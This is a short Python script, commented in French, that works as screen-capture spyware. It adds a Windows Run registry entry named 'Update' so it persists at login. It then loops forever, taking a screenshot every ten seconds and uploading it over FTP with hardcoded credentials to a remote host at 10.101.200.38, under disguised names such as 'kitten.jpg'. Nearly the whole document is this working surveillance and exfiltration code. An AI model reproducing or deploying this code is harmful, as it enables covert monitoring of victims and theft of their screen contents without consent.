#Ouvrir une conenxion FTP, envoyer le fichier, fermer la connexion, supprimer le fichier


import pyautogui, ftplib, time, os
from winreg import *

keyval=r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
if not os.path.exists("keyval"):
	key = CreateKey(HKEY_CURRENT_USER,keyval)
	Registrykey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,KEY_WRITE)
	SetValueEx(Registrykey,"Update",0,REG_SZ,"C:\Users\Administrateur\Documents\update.exe")
	CloseKey(Registrykey)



while True:
	session = ftplib.FTP('10.101.200.38','user1','user1')     
	# Take screenshot
	pic = pyautogui.screenshot()
	     
	# Save the image
	pic.save("C:\Users\Administrateur\AppData\Local\Temp\Screenshot.png") 

	#connexion to FTP

	filesend = open('C:\Users\Administrateur\AppData\Local\Temp\Screenshot.png','rb')
	session.storbinary('STOR kitten.jpg' + time.strftime("%Y-%m-%d %H:%M:%S") , filesend)
	filesend.close()                                  
	session.quit()
	time.sleep(10)